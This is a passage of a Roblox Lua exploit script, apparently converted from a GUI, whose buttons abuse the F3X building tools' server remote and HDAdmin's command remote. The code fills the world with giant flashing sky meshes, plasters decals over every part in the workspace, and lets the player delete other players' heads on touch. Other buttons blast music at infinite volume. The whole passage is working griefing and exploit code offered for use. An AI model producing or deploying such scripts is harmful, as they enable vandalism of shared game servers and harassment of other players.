					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					return buildingTools
				end
	
				local buildingTools = findBuildingTools()
	
				if buildingTools then
					local syncAPI = buildingTools:FindFirstChild("SyncAPI")
					if syncAPI then
						local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
						if serverEndpoint then
							if workspace:FindFirstChild("sky") then
								local args = {
									[1] = "Remove",
									[2] = {
										[1] = workspace.sky
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							else
								local args = {
									[1] = "CreatePart",
									[2] = "Normal",
									[3] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0, 0, 0),
									[4] = workspace
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetName",
									[2] = {
										[1] = workspace.Part
									},
									[3] = "sky"
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncCollision",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["CanCollide"] = false
										}
									}
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetLocked",
									[2] = {
										[1] = workspace.sky
									},
									[3] = true
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
	
								local args = {
									[1] = "CreateMeshes",
									[2] = {
										[1] = {
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["MeshType"] = Enum.MeshType.FileMesh,
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["MeshId"] = "rbxassetid://111891702759441"
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["Scale"] = Vector3.new(4000, 4000, 4000)
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								while true do
									for _, image in ipairs(images) do
										local args = {
											[1] = "SyncMesh",
											[2] = {
												[1] = {
													["Part"] = workspace.sky,
													["TextureId"] = image
												}
											}
										}
										serverEndpoint:InvokeServer(unpack(args))
										wait(0.06)
									end
								end
							end
						end
					end
				end
			end)
		end;
		task.spawn(C_b8);
		-- StarterGui.f3xmain2.Frame.main3.skies.syn.LocalScript
		local function C_ba()
			local script = G2L["ba"];
			local warned = false
	
			script.Parent.Activated:Connect(function()
				local function findBuildingTools()
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					return buildingTools
				end
	
				local buildingTools = findBuildingTools()
	
				if buildingTools then
					local syncAPI = buildingTools:FindFirstChild("SyncAPI")
					if syncAPI then
						local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
						if serverEndpoint then
							if workspace:FindFirstChild("sky") then
								local args = {
									[1] = "Remove",
									[2] = {
										[1] = workspace.sky
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							else
								local args = {
									[1] = "CreatePart",
									[2] = "Normal",
									[3] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0, 0, 0),
									[4] = workspace
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetName",
									[2] = {
										[1] = workspace.Part
									},
									[3] = "sky"
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncCollision",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["CanCollide"] = false
										}
									}
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetLocked",
									[2] = {
										[1] = workspace.sky
									},
									[3] = true
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
	
								local args = {
									[1] = "CreateMeshes",
									[2] = {
										[1] = {
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["MeshType"] = Enum.MeshType.FileMesh,
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["MeshId"] = "rbxassetid://111891702759441"
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["Scale"] = Vector3.new(4000, 4000, 4000)
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["TextureId"] = "http://www.roblox.com/asset/?id=9818809996"
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							end
						end
					end
				end
			end)
		end;
		task.spawn(C_ba);
		-- StarterGui.f3xmain2.TextButton.LocalScript
		local function C_c1()
			local script = G2L["c1"];
			local b = script.Parent
			local page1 = script.Parent.Parent.Frame
	
			b.Activated:Connect(function()
				page1.Visible = not page1.Visible
			end)
	
		end;
		task.spawn(C_c1);
	
		return G2L["1"], require;
	end)
end
coroutine.wrap(BPDDW_fake_script)()
local function ENIGXR_fake_script() -- TextButton_37.LocalScript 
	local script = Instance.new('LocalScript', TextButton_37)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";music 1839270925 ")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";volume inf")
	end)
end
coroutine.wrap(ENIGXR_fake_script)()
local function AWREK_fake_script() -- TextButton_38.LocalScript 
	local script = Instance.new('LocalScript', TextButton_38)

	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"8006679977")
					SetTexture(v,id)
					--end)
					MeshResize(v,Vector3.new(50,50,50))
					SetLocked(v,true)
				end
			end
		end
		Sky("124144172291549")
	end)
end
coroutine.wrap(AWREK_fake_script)()
local function TYLCVM_fake_script() -- TextButton_39.LocalScript 
	local script = Instance.new('LocalScript', TextButton_39)

	script.Parent.MouseButton1Click:Connect(function()
		--rgrg
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)
	
						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)
	
						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)
	
						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)
	
						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam("124144172291549")
	end)
end
coroutine.wrap(TYLCVM_fake_script)()
local function GBDOZ_fake_script() -- TextButton_40.LocalScript 
	local script = Instance.new('LocalScript', TextButton_40)

	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Thomas(player)
			SetAnchor(true,char.HumanoidRootPart)
			CreatePart(char.HumanoidRootPart.CFrame,char)
			SetCollision(char.Part,false)
			SetLocked(char.Part,false)
			CreateSpotlight(char.Part)
			SyncLighting(char.Part,100)
			SetLocked(char.HumanoidRootPart,false)
			Weld(char.Part,char.HumanoidRootPart,char.Part)
			SetAnchor(false,char.Part)
			AddMesh(char.Part)
			MeshResize(char.Part,Vector3.new(3,3,3))
			SetMesh(char.Part,"4340968808")
			SetTexture(char.Part,"4340968918")
			SetAnchor(false,char.HumanoidRootPart)
			char.Humanoid.WalkSpeed = 100
			char.HumanoidRootPart.Touched:connect(function(obj)
				if obj.Parent:FindFirstChild("Humanoid") then
					SetLocked(obj.Parent.Head,false)
					DestroyPart(obj.Parent.Head)
				end
			end)
			game:GetService("RunService").RenderStepped:Connect(function()
				for i,v in char:GetDescendants() do
					if v:IsA("BasePart") then
						char.Humanoid.WalkSpeed = 100
						v.CanCollide = false
					end
				end
			end)
		end
		Thomas(player)
	end)
end
coroutine.wrap(GBDOZ_fake_script)()
local function BTIMS_fake_script() -- TextButton_41.LocalScript 
	local script = Instance.new('LocalScript', TextButton_41)

	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";music 72089843969979")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";volume inf")
		game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(";pitch 0.19")
	end)
end
coroutine.wrap(BTIMS_fake_script)()
local function MFEKMZ_fake_script() -- main.LocalScript 
	local script = Instance.new('LocalScript', main)

	local xd = script.Parent
	xd.Draggable = true
	xd.Active = true
	
end
coroutine.wrap(MFEKMZ_fake_script)()
